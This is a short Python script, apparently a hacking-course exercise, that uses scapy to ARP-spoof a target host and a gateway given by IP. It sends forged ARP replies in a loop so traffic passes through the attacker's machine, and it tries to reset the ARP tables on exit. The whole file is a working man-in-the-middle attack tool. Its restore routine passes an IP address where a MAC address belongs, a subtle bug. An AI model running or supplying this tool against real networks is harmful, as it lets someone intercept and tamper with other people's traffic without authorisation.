#!/usr/bin/env python

import scapy.all as scapy
import time
import sys 
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-src', action = "store", type = str, dest = "src", help = "source IP Address", required = True)
parser.add_argument('-dst', action = 'store', type = str, dest = "dst", help = "destination IP address", required = True)
args = vars(parser.parse_args())
src = format(args["src"])
dst = format(args["dst"])

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst = target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose = False)

target_ip = src
gateway_ip = dst

try: 
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r [+] Sent packets: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Detected CTRL + C ...... Resetting ARP tables.... Please wait.\n\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
#print (packet.show())
#print(packet.summary())